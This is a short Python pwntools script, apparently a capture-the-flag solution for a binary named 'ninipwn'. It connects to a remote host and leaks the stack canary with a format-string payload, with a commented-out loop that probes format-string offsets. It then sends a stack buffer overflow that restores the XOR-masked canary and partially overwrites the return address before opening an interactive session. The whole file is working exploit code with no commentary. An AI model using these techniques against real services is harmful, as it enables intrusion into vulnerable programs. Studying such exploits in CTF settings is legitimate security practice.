from pwn import *

io = remote("3.75.185.198", 7000)
# io = process("./ninipwn")
# io = gdb.debug("./ninipwn", 
# '''
# break encryption_service
# c
# ''')
context.log_level = 'debug' 

# for i in range(1, 300):
#     io = process("./ninipwn")
#     io.recvuntil("th: ")
#     io.sendline("1")
#     io.recvuntil("y: ")
#     io.sendline(f"%{i}$p")
#     try:
#         print(f"recieved at {i}: {io.recvline()}")
#     except:
#         continue

io.recvuntil("th: ")
io.sendline("9")
io.recvuntil("y: ")
io.send(b"%39$p%22\x19\x01")
io.recvuntil("cted: ")
canary = io.recv(18).decode()
print("Canary: ", canary)
canary = int(canary, 16)
io.recvuntil("t:")

payload = b'a'*0x108
payload += p64(canary^3616994614306222885)
payload += b'a'*8
payload += bytearray.fromhex("16")

io.send(payload)
io.interactive()